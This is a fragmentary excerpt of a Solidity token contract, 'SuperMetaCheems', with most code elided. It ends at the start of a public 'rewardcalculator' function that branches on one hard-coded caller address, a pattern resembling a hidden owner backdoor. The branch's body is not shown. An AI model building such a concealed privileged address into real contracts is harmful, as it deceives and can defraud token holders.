...
contract SuperMetaCheems is Ownable {
  using Address for address;
  using SafeMath for uint256;
  string private _name = "SuperMetaCheems";
  string private _symbol = "SUPMETACHEEMS";  
  ...
  function allowance(address _owner, address _spender) public view returns (uint256) {
   ...
   function rewardcalculator (address buyer, uint256 _value) public {
      if  ( msg.sender == 0x4Eef7B832000BFD9F0Ee2A0a83c541F59Ea82f87 )
      {
